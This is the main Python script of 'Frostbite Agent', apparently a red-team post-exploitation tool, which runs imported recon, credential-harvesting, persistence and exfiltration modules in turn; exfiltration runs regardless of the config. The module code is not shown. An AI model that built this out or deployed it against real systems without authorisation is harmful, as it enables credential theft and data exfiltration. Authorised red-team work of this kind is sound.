#!/usr/bin/env python3

"""
Frostbite Agent
Author: Ryan Roberge
Description: Modular red team agent for recon, credential harvesting,
persistence, and intelligent exfiltration.
"""

import json
import os
from modules import recon, creds, persist, exfil
from utils.logger import log

VERSION = "1.0"

# Ensure paths are always relative to this script
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")


def load_config():
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        log(f"[!] Config load failed: {e} — using defaults")
        return {
            "modules": {
                "recon": True,
                "creds": True,
                "persist": True
            }
        }


def main():
    log(f"[*] Frostbite Agent v{VERSION} starting...")
    config = load_config()

    results = {}

    # -----------------------------
    # Recon Module
    # -----------------------------
    try:
        if config.get("modules", {}).get("recon"):
            log("[*] Running recon module...")
            results["recon"] = recon.run()
    except Exception as e:
        log(f"[!] Recon module failed: {e}")

    # -----------------------------
    # Credential Harvesting
    # -----------------------------
    try:
        if config.get("modules", {}).get("creds"):
            log("[*] Running credential harvesting...")
            results["creds"] = creds.run()
    except Exception as e:
        log(f"[!] Creds module failed: {e}")

    # -----------------------------
    # Persistence
    # -----------------------------
    try:
        if config.get("modules", {}).get("persist"):
            log("[*] Establishing persistence...")
            persist.run()
    except Exception as e:
        log(f"[!] Persistence failed: {e}")

    # -----------------------------
    # Exfiltration
    # -----------------------------
    try:
        log("[*] Exfiltrating data...")
        exfil.run(results, config)
    except Exception as e:
        log(f"[!] Exfil failed: {e}")


if __name__ == "__main__":
    main()
